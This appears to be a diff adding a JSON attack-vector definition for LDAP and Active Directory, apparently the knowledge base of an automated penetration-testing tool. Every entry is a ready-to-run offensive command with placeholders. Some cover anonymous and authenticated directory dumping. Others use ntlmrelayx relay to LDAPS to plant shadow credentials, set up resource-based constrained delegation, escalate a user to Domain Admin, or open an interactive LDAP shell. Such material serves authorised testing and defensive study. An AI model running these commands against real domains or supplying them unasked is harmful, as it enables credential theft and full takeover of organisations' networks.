@@ -1,0 +1,84 @@
+{
+  "service": "LDAP/Active Directory",
+  "description": "Lightweight Directory Access Protocol - Active Directory enumeration and exploitation",
+  "ports": [389, 636, 3268, 3269],
+  "serviceNames": ["ldap", "ldaps", "ms-wbt-server"],
+  "targetOs": ["Windows"],
+  "vectors": [
+    {
+      "id": "ldap_anonymous_enum",
+      "name": "Anonymous LDAP Enumeration",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Enumerate LDAP without authentication",
+      "commands": [
+        {
+          "tool": "nmap",
+          "syntax": "nmap -n -sV --script 'ldap*' and not brute -p 389 <target>",
+          "description": "LDAP enumeration with NSE scripts"
+        },
+        {
+          "tool": "ldapsearch",
+          "syntax": "ldapsearch -x -H ldap://<target> -s base",
+          "description": "Anonymous LDAP search"
+        }
+      ],
+      "outcomes": ["domain_info", "naming_context"]
+    },
+    {
+      "id": "ldap_authenticated_enum",
+      "name": "Authenticated LDAP Enumeration",
+      "phase": "lateral_movement",
+      "prerequisites": ["valid_credentials"],
+      "description": "Deep LDAP enumeration with valid credentials",
+      "commands": [
+        {
+          "tool": "ldeep",
+          "syntax": "ldeep ldap -u <user> -p '<password>' -d <domain> -s ldap://<target> all <backup_folder>",
+          "description": "Comprehensive LDAP dump"
+        },
+        {
+          "tool": "ldapdomaindump",
+          "syntax": "ldapdomaindump -u <user> -p <password> -o <dump_folder> ldap://<target>:389",
+          "description": "Domain dump via LDAP"
+        },
+        {
+          "tool": "ldapsearch-ad",
+          "syntax": "ldapsearch-ad.py -l <target> -d <domain> -u <user> -p '<password>' -o <output.log> -t all",
+          "description": "AD-specific LDAP search"
+        }
+      ],
+      "outcomes": ["users", "groups", "computers", "acl", "delegation"]
+    },
+    {
+      "id": "ldap_relay_shadow_creds",
+      "name": "LDAP Relay for Shadow Credentials",
+      "phase": "privilege_escalation",
+      "prerequisites": ["smb_signing_disabled"],
+      "description": "Relay SMB auth to LDAPS to add shadow credentials",
+      "commands": [
+        {
+          "tool": "ntlmrelayx",
+          "syntax": "ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'",
+          "description": "Relay to LDAPS for shadow credentials attack"
+        },
+        {
+          "tool": "ntlmrelayx",
+          "syntax": "ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access",
+          "description": "Relay to LDAPS for RBCD attack"
+        },
+        {
+          "tool": "ntlmrelayx",
+          "syntax": "ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --escalate-user <user>",
+          "description": "Relay to LDAPS to escalate user to Domain Admin"
+        },
+        {
+          "tool": "ntlmrelayx",
+          "syntax": "ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --interactive",
+          "description": "Interactive LDAP shell (connect with nc 127.0.0.1 11000)"
+        }
+      ],
+      "outcomes": ["shadow_credentials", "rbcd", "domain_admin"]
+    }
+  ]
+}
